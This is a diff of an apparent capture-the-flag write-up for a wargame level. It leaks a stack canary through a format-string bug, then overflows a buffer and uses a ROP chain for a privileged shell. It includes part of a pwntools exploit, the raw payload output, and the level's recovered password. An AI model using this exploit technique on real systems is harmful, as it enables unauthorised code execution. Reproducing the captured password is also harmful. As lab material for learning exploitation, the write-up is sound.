@@ -96,9 +96,16 @@ level06@rainfall:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"%p "*20)' 
 
 The purpose here is to find the canary value, then use it in the payload to bypass the canary check, and then use a rop chain as we proviously did to spawn a shell with correct uid.
 
+We'll suppose for the following attempt that the canary is stored at position 15 (value that ends with \x00 and change everytime we run the programm)
 
+First step:
+* gather the canary with the first gets + unprotected printf -> %15$p will print it, then we store it in a variable
 
-=--=
+Second step:
+* fill the buffer (A * 136)
+* add the canary to prevent stack smashing detection
+* overwrite RBP with ROP-Gadget
+
 ```python
 from pwn import *
 
@@ -126,3 +133,28 @@ p.sendlineafter(b'Access code: ', payload)
 
 p.interactive()                  # to stay in stdin (like (...; cat) |)
 ```
+
+```bash
+python3 test.py
+[*] '/home/level06/3jane'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[+] Starting local process './3jane': pid 2058
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00$\xf6)\x8ez%sAAAAAAAA\x8d\xc0\xd0\xf7\xff\x7f\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00}\x0b\xd1\xf7\xff\x7f\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00ps\xd2\xf7\xff\x7f\x00\x00\x8d\xc0\xd0\xf7\xff\x7f\x00\x00/\xc4\xdc\xf7\xff\x7f\x00\x00P\x87\xc5\xf7\xff\x7f\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00$\xf6)\x8ez%sP\xe2\xff\xff\xff\x7f\x00\x00'
+[*] Switching to interactive mode
+[3JANE] Access denied.
+$ whoami
+flag06
+$ cat /home/flag06/.pass
+c1t0kg9pklac7x4c7sn7iqgfppkz4usq
+$ 
+
+```
+
+Success !
